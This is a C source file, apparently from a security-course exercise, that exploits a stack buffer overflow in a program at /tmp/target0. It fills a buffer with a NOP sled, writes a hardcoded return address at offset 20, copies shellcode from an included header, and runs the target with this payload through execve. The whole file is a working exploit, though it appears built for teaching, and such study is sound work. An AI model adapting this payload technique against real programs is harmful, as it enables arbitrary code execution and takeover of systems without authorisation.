#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"
#define NOP 0x90

char payload[100];

void make_payload(){
  int i = 0; 
  for(i = 0; i < 100; i++)
    payload[i] = NOP;

  //Want to Send to Address: ????
  payload[20] = 0x24;
  payload[21] = 0xfe;
  payload[22] = 0xff;
  payload[23] = 0xbf;

  strncpy(payload+24, shellcode, 54);

  payload[99] = 0x00;
} 

int main(void) {
  char *args[] = { TARGET, payload, NULL };
  char *env[] = { NULL };

  make_payload();

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");
  
  return 0;
}
